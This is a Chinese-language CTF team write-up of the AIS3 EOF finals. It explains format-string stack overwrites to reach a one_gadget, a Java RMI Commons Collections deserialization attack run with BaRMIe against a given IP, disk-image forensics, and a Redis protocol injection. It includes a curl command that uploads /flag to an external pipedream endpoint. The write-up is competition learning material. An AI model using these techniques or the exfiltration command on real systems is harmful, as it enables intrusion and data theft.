# AIS3 EOF Final writeup

## bolqs 7th place 2519 pt

zodf0055980-1736 pt
pi3la-783 pt
shyang0117
bclin
![](https://i.imgur.com/3K9dkGi.png)


# Pwn
## Whitehole
buffer 在 global 上的 fmt，只能去利用 stack 上原本的值。
因為和第二題題組，第二題不能改 got 所以我就沒有去用 GOT hijacking
一開始可以透過 %p,%p 去拿到 stack 上的值去 leak libc 和 pie 的位置
首先先看 stack 上的值，因為我們只能去更改到 stack 上的所放的記憶體位置
```
0000| 0x7ffda5e456d0 --> 0x7ffda5e456e0 --> 0x7ffda5e456f0 --> 0x5563f0d91220 (<__libc_csu_init>:       push   r15)
0008| 0x7ffda5e456d8 --> 0x5563f0d911fa (<black_hole+36>:       jmp    0x5563f0d911da <black_hole+4>)
0016| 0x7ffda5e456e0 --> 0x7ffda5e456f0 --> 0x5563f0d91220 (<__libc_csu_init>:  push   r15)
0024| 0x7ffda5e456e8 --> 0x5563f0d91214 (<main+24>:     mov    eax,0x0)
0032| 0x7ffda5e456f0 --> 0x5563f0d91220 (<__libc_csu_init>:     push   r15)
0040| 0x7ffda5e456f8 --> 0x7f5fb39dcb97 (<__libc_start_main+231>:       mov    edi,eax)
0048| 0x7ffda5e45700 --> 0x1
0056| 0x7ffda5e45708 --> 0x7ffda5e457d8 --> 0x7ffda5e45e3f ("./whitehole")
0064| 0x7ffda5e45710 --> 0x100008000
0072| 0x7ffda5e45718 --> 0x5563f0d911fc (<main>:        push   rbp)
0080| 0x7ffda5e45720 --> 0x0
0088| 0x7ffda5e45728 --> 0xef65f1261eaa62d5
0096| 0x7ffda5e45730 --> 0x5563f0d91070 (<_start>:      xor    ebp,ebp)
0104| 0x7ffda5e45738 --> 0x7ffda5e457d0 --> 0x1
```
我這邊先選擇 `0x7ffda5e456d0` 和 `0x7ffda5e45708` 因為他可以改到 stack 上的值，把 stack 上的直去指向 `0x7ffda5e456f8` 和 `0x7ffda5e456f8 + 2`
之後便可以透過剛剛修改的位置去改 `0x7ffda5e456f8` 使他變成 `onegadget` 位置(剛好只需要修改到後 4個 byte)
之後把 `0x7ffda5e456d8` 的位置改成 `main+24` 也就是從 black_hole 要跳回 main 後的位置 (因為是 while 無窮迴圈 所以不會回 main)
這樣 stack 會長成這樣
```
0000| 0x7fffd8cd9770 --> 0x7fffd8cd9780 --> 0x7fffd8cd9778 --> 0x557f6a39d214 (<main+24>:	mov    eax,0x0)
0008| 0x7fffd8cd9778 --> 0x557f6a39d214 (<main+24>:	mov    eax,0x0)
0016| 0x7fffd8cd9780 --> 0x7fffd8cd9778 --> 0x557f6a39d214 (<main+24>:	mov    eax,0x0)
0024| 0x7fffd8cd9788 --> 0x557f6a39d214 (<main+24>:	mov    eax,0x0)
0032| 0x7fffd8cd9790 --> 0x557f6a39d220 (<__libc_csu_init>:	push   r15)
0040| 0x7fffd8cd9798 --> 0x7fe834676322 (<do_system+1138>:	mov    rax,QWORD PTR [rip+0x39bb7f]        # 0x7fe834a11ea8)
0048| 0x7fffd8cd97a0 --> 0x1 
0056| 0x7fffd8cd97a8 --> 0x7fffd8cd9878 --> 0x7fffd8cd979a --> 0x100007fe83467 
```
他會在 myprintf 中的 ret 跳回 main+24 並在 main 的 ret 在跳到 main + 24
而最後 main 的 ret 會跳到 onegadget 的位置

## Blackhole
變成 Full RELRO 但我在 Whitehole 沒用到 GOT hijacking 所以沒有差 XD
但在 dprintf 的 fd 變成 2，會用 stderr 傳出來，而 remote 端則不會顯示，因此要想辦法去寫掉 fd。
因為 fd offset 是 0x4010，因此我們如果寫進後 2 byte，執行時就有 1/16 的機率成功寫成 fd 的位置。(0x3010 - 0xf010)都有機會成功
修改完 fd 後就和 whitehole 解法一樣了。

# Reverse
## Gift
拆開 gz 檔會有一支程式，程式輸入正確密碼的話會輸出新的 gz 檔，裡面也有一支程式。
而透過 reverse 可以找到比較字串的位置在檔案的 0x8F8 後的 256 個 char。
因此可以透過寫腳本去循環解開檔案。解了 1000 遍後能拿到 flag 了。

# Web
## babyRMI2
題目有說是 RMI + Apache Common Collections
而看了一下引用的 common collections 版本是 3.2.1，是有問題的版本，因此可以透過[反序列化](https://wooyun.js.org/drops/java RMI相关反序列化漏洞整合分析.html)去 RCE
而出題者有說比 .git 洩漏簡單，因此猜測有工具使用
我使用 [BaRMIe_v1.01.jar](https://github.com/NickstaDB/BaRMIe)
```
java -jar BaRMIe_v1.01.jar -attack 140.113.203.209 11099
Deserialization payloads for: 140.113.203.209:11099
```
選擇對應的 Apache
Apache Commons Collections 3.1, 3.2, 3.2.1

他在 docker 有裝好 curl，因此可以用 curl 簡單得傳出來
curl -X POST -T /flag https://enhyyyue2ig9n.x.pipedream.net/

# Misc
## recovery
給一個 1G 的 diskimage 檔，如果直接對他用 strings 會有很多很明顯的 base64encode
使用 [Autopsy](https://www.sleuthkit.org/autopsy/) 這套工具可以去看 diskimage 中的檔案，會發現會有幾個特殊名稱的檔案
把該檔案內容做 decode，可以解出 flag 片段，多找幾個檔案湊一湊就出來了

# 官方 writeup
[babyRMI](https://hackmd.io/gwfYtqxwTz-DZ9H0g4UUAw?view)
[babyfirst & imagination](https://github.com/BookGin/my-ctf-challenges#ais3-eof-ctf-2019-finals)
[easyROP, Lucky, Unlucky](https://github.com/how2hack/my-ctf-challenges/tree/master/eof_finalctf-2020)
[TT TT_Revenge Whitehole Blackhole](https://github.com/yuawn/CTF/tree/master/2020/eof-final)
[CureURL](https://gist.github.com/CykuTW/edb0d7b39ecdc16a16cc05b149181a02) 簡單說明： Redis 用的協議 RESP 計算資料長度都是以 byte 為單位，而題目故意用 mb_strlen 去計算字串長度，這個函數遇到 unicode 字元會回傳「真的字元數」而非 byte 數量，例如中文字「倫」有 3 bytes 但 mb_strlen 只會回傳 1，所以可以攪爛 RESP 執行任意 redis command，最後串 cmd injection 就好了
